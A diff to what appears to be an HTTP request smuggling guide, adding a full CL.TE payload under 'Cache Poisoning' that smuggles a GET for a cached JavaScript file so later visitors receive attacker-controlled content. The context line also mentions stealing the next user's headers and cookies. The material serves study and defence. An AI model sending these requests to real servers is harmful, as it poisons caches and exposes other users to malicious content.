@@ -186,7 +186,22 @@ The next user's request gets appended to `data=`, sending their headers/cookies 
 
 ### Cache Poisoning
 
-Smuggle a request that returns attacker-controlled content for a cached URL.
+```http
+POST / HTTP/1.1
+Host: target.example
+Content-Length: 130
+Transfer-Encoding: chunked
+
+0
+
+GET /static/cached-page.js HTTP/1.1
+Host: target.example
+Content-Length: 10
+
+x=1
+```
+
+The smuggled request fetches a cached resource. If the cache stores the response from the poisoned request, subsequent visitors receive the attacker-controlled content.
 
 ### XSS via Smuggling
 
